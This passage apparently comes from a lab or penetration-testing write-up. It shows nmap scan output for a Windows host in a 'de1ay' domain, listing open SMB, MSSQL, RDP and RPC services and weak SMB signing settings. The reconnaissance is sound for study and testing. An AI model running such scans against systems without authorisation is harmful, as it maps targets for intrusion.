> 139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
> 445/tcp   open  microsoft-ds   Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
> 1433/tcp  open  ms-sql-s       Microsoft SQL Server 2008 R2 10.50.4000.00; SP2
> |_ms-sql-info: ERROR: Script execution failed (use -d to debug)
> | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
> | Not valid before: 2023-08-18T23:51:09
> |_Not valid after:  2053-08-18T23:51:09
> |_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
> |_ssl-date: 2023-08-19T01:11:49+00:00; -1s from scanner time.
> 3389/tcp  open  ms-wbt-server?
> | ssl-cert: Subject: commonName=WEB.de1ay.com
> | Not valid before: 2023-08-17T14:56:42
> |_Not valid after:  2024-02-16T14:56:42
> |_ssl-date: 2023-08-19T01:11:49+00:00; -1s from scanner time.
> | rdp-ntlm-info: 
> |   Target_Name: DE1AY
> |   NetBIOS_Domain_Name: DE1AY
> |   NetBIOS_Computer_Name: WEB
> |   DNS_Domain_Name: de1ay.com
> |   DNS_Computer_Name: WEB.de1ay.com
> |   DNS_Tree_Name: de1ay.com
> |   Product_Version: 6.1.7601
> |_  System_Time: 2023-08-19T01:11:09+00:00
> 49152/tcp open  msrpc          Microsoft Windows RPC
> 49153/tcp open  msrpc          Microsoft Windows RPC
> 49154/tcp open  msrpc          Microsoft Windows RPC
> 49155/tcp open  msrpc          Microsoft Windows RPC
> 49156/tcp open  msrpc          Microsoft Windows RPC
> MAC Address: 00:0C:29:ED:B0:16 (VMware)
> Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
> Aggressive OS guesses: Microsoft Windows 7 (98%), Microsoft Windows Phone 7.5 or 8.0 (97%), Microsoft Windows Server 2008 or 2008 Beta 3 (97%), Microsoft Windows Server 2008 R2 or Windows 8.1 (97%), Microsoft Windows 7 Professional or Windows 8 (97%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (97%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (97%), Microsoft Windows Embedded Standard 7 (97%), Microsoft Windows 8.1 R1 (96%), Microsoft Windows Server 2008 SP1 (94%)
> No exact OS matches for host (test conditions non-ideal).
> Network Distance: 1 hop
> Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
> 
> Host script results:
> | smb2-security-mode: 
> |   210: 
> |_    Message signing enabled but not required
> | smb2-time: 
> |   date: 2023-08-19T01:11:13
> |_  start_date: 2023-08-18T23:51:35
> | smb-security-mode: 
> |   account_used: guest
> |   authentication_level: user
> |   challenge_response: supported
> |_  message_signing: disabled (dangerous, but default)
> 
> TRACEROUTE
> HOP RTT     ADDRESS
> 1   0.86 ms 192.168.199.131 (192.168.199.131)
> 
> OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
> Nmap done: 1 IP address (1 host up) scanned in 130.56 seconds
> [09:11:50] [cost 130.626s] nmap -sS -sV -Pn -T4 -A 192.168.199.131 
> 
> ```
>
> 
